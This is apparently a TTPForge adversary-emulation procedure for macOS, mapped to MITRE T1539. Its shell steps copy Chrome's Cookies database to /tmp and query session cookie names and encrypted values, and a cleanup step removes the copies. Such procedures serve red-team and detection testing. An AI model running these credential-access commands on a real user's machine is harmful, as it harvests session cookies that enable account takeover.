---
api_version: 2.0
uuid: 0b46e8d9-199d-4581-aadc-6281f9c61d2b
name: Chrome Cookie Extraction
authors:
- TTPForge
description: |
  Extract cookies from Google Chrome browser
mitre:
  tactics:
  - TA0006 Credential Access
  techniques:
  - T1539 Steal Web Session Cookie
requirements:
  platforms:
  - os: darwin
args:
- name: output_file
  description: File to store extracted cookies
  type: string
  default: /tmp/chrome_cookies.txt
- name: chrome_user
  description: Chrome user profile to target
  type: string
  default: Default
steps:
- name: Check Chrome Profile
  inline: test -d ~/Library/Application\ Support/Google/Chrome/{{ .Args.chrome_user }} && echo 'Chrome profile found'
- name: Copy Chrome Database
  inline: cp ~/Library/Application\ Support/Google/Chrome/{{ .Args.chrome_user }}/Cookies /tmp/Cookies_copy 2>/dev/null ||
    true
- name: Query Chrome Cookies
  inline: sqlite3 /tmp/Cookies_copy 'SELECT host_key, name, encrypted_value FROM cookies LIMIT 10;' 2>/dev/null | head -20
  cleanup:
    inline: rm -f /tmp/Cookies_copy {{ .Args.output_file }}
tests:
- name: dry_run_test
  dry_run: true
